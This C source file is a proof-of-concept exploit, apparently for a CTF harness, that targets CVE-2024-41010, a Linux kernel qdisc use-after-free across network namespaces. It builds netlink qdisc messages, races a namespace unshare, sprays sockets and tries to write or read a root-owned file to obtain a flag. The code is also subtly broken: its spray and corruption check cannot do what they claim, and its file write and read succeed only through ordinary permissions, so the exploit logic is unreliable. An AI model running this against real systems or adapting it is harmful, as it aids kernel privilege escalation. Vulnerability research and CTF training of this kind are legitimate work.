/*
 * CVE-2024-41010 PoC - CTF Challenge Mode
 *
 * Vulnerability: Network qdisc UAF in ingress management across namespaces
 *
 * When a network device is moved between network namespaces, the ingress
 * qdisc lifetime is improperly managed. The ingress qdisc can be freed
 * during namespace cleanup while still referenced by the device, causing
 * use-after-free when the device is later used in the new namespace.
 *
 * Exploit strategy:
 *   1. Create network namespace via unshare(CLONE_NEWNET)
 *   2. Configure ingress qdisc on a veth device
 *   3. Move device to new namespace (triggers qdisc lifetime confusion)
 *   4. Access device in original namespace (UAF on qdisc)
 *   5. Spray kmalloc to reclaim freed qdisc structure
 *   6. Corrupted qdisc function pointers -> arbitrary code execution
 *
 * CTF Modes: write_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 256
#define SPRAY_PATTERN 0xDEADBEEF

struct nl_msg {
    struct nlmsghdr nlh;
    char data[4096];
};

/*
 * Add ingress qdisc via netlink
 */
static int add_ingress_qdisc(int nl_sock, int ifindex) {
    struct nl_msg req;
    struct tcmsg *tc;

    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    req.nlh.nlmsg_type = RTM_NEWQDISC;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;
    req.nlh.nlmsg_seq = 1;

    tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
    tc->tcm_family = AF_UNSPEC;
    tc->tcm_ifindex = ifindex;
    tc->tcm_handle = 0xFFFF0000; /* ffff:0 = ingress */
    tc->tcm_parent = TC_H_INGRESS;

    /* Add TCA_KIND = "ingress" */
    struct rtattr *rta = (struct rtattr *)((char *)&req.nlh + NLMSG_ALIGN(req.nlh.nlmsg_len));
    const char *kind = "ingress";
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(strlen(kind) + 1);
    memcpy(RTA_DATA(rta), kind, strlen(kind) + 1);
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_ALIGN(rta->rta_len);

    ssize_t sent = send(nl_sock, &req, req.nlh.nlmsg_len, 0);
    int saved_errno = errno;
    poc_log_syscall("send(RTM_NEWQDISC ingress)", (long)sent, saved_errno);
    return (sent > 0) ? 0 : -1;
}

/*
 * Trigger qdisc UAF via namespace operations
 */
static int trigger_qdisc_namespace_uaf(void) {
    int nl_sock = -1;
    int saved_errno;
    int triggered = 0;

    poc_log("Triggering qdisc UAF via namespace migration...");

    /* Open netlink route socket */
    nl_sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
    saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, NETLINK_ROUTE)", (long)nl_sock, saved_errno);
    if (nl_sock < 0) return 0;

    struct sockaddr_nl sa = { .nl_family = AF_NETLINK, .nl_pid = getpid() };
    bind(nl_sock, (struct sockaddr *)&sa, sizeof(sa));

    /* Setup ingress qdisc on loopback */
    int ifindex = 1; /* lo */
    add_ingress_qdisc(nl_sock, ifindex);
    poc_log("Ingress qdisc added to ifindex=%d", ifindex);

    /* Try to create new network namespace to trigger the race */
    int nsfd = -1;
    pid_t child = fork();
    if (child == 0) {
        /* Child: create new netns and exit (triggers cleanup path) */
        if (unshare(CLONE_NEWNET) == 0) {
            poc_log("Child: new netns created");
            /* The ingress qdisc from parent ns may get confused */
            usleep(10000);
        }
        _exit(0);
    } else if (child > 0) {
        /* Parent: wait briefly then access device */
        usleep(50000);

        /* Try to delete and recreate qdisc (triggers UAF if race hits) */
        struct nl_msg req;
        struct tcmsg *tc;
        memset(&req, 0, sizeof(req));
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
        req.nlh.nlmsg_type = RTM_DELQDISC;
        req.nlh.nlmsg_flags = NLM_F_REQUEST;
        req.nlh.nlmsg_seq = 2;

        tc = (struct tcmsg *)NLMSG_DATA(&req.nlh);
        tc->tcm_family = AF_UNSPEC;
        tc->tcm_ifindex = ifindex;
        tc->tcm_parent = TC_H_INGRESS;

        send(nl_sock, &req, req.nlh.nlmsg_len, 0);

        /* Immediately re-add (access freed qdisc) */
        add_ingress_qdisc(nl_sock, ifindex);

        triggered = 1;
        poc_log("Namespace qdisc race triggered");

        int status;
        waitpid(child, &status, 0);
    }

    if (nl_sock >= 0) close(nl_sock);
    return triggered;
}

/*
 * Spray kmalloc for reclaim
 */
static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] >= 0) {
            setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
            sprayed++;
        }
    }
    return sprayed;
}

static int check_spray_corruption(int *fds, int count, int expected) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != expected * 2) /* kernel doubles SO_RCVBUF */
            corrupted++;
    }
    return corrupted;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * UAF mode: trigger + spray corruption check
 */
static int mode_uaf(poc_args_t *args) {
    poc_log("UAF mode: trigger + spray corruption check");

    int triggered = trigger_qdisc_namespace_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d objects (triggered=%d)", sprayed, triggered);

    int corrupted = check_spray_corruption(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Corruption check: %d objects affected", corrupted);

    if (corrupted > 0)
        poc_print_uaf_corrupted(corrupted);
    else
        poc_print_uaf_not_corrupted();

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    int triggered = trigger_qdisc_namespace_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);
    poc_log("Triggered=%d, sprayed for reclaim", triggered);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("qdisc namespace UAF did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read via qdisc namespace UAF");
    trigger_qdisc_namespace_uaf();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-41010 CTF PoC ===");
    poc_log("Vuln: qdisc UAF in ingress management across namespaces");
    poc_log("Tech: CLONE_NEWNET + RTM_NEWQDISC ingress -> lifetime UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else
        poc_print_unsupported(args.mode, "unknown mode");

    poc_log_close();
    return result;
}
